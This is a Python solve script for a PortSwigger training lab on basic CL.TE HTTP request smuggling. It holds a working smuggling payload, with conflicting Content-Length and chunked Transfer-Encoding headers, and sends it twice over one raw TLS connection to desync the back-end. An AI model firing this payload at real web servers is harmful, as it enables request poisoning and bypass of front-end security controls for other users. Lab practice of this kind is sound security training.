#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: HTTP request smuggling, basic CL.TE.

The front-end uses Content-Length; the back-end honours Transfer-Encoding.
We send a request with both headers, where the back-end stops at the chunked
`0` terminator and leaves a trailing `G` in the socket buffer. The next
request on the connection gets prefixed to `GPOST`, producing the lab's
solve-marker error.

Uses a raw TLS socket because `requests` normalizes conflicting length
headers and would break the exploit.
"""

import argparse
import socket
import ssl
import sys
from urllib.parse import urlparse


SMUGGLE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Connection: keep-alive\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "G"
)


def send_raw(host: str, port: int, requests: list[bytes]) -> list[bytes]:
    """Open one TLS connection and send each request in sequence, reading responses."""
    ctx = ssl.create_default_context()
    responses = []
    with socket.create_connection((host, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            for req in requests:
                ssock.sendall(req)
                # Read response — small chunks until we see end of headers + body
                data = b""
                ssock.settimeout(5)
                try:
                    while True:
                        chunk = ssock.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                        if b"\r\n\r\n" in data and len(data) > 100:
                            break
                except socket.timeout:
                    pass
                responses.append(data)
    return responses


def main():
    parser = argparse.ArgumentParser(description="Solve HTTP Request Smuggling Lab 1 (basic CL.TE)")
    parser.add_argument("lab_url", help="Lab URL, e.g. https://0aXX...web-security-academy.net")
    args = parser.parse_args()

    parsed = urlparse(args.lab_url)
    host = parsed.hostname
    port = parsed.port or 443

    body = SMUGGLE.format(host=host).encode()
    print(f"[*] Sending smuggle request twice over one TLS connection to {host}:{port}")

    responses = send_raw(host, port, [body, body])
    for i, r in enumerate(responses, 1):
        head = r.split(b"\r\n\r\n", 1)[0].decode(errors="replace")
        print(f"\n[+] Response {i} status line + first lines:\n{head[:300]}")

    if b"GPOST" in responses[1] or b"Unrecognized method" in responses[1]:
        print("\n[+] Smuggling confirmed — back-end saw 'GPOST'. Lab should be solved.")
    else:
        print("\n[-] Did not see 'Unrecognized method GPOST' in the second response.")
        print("    - Confirm the lab is live and uses CL.TE desync.")
        print("    - Some labs need a fresh connection — rerun the script.")


if __name__ == "__main__":
    main()
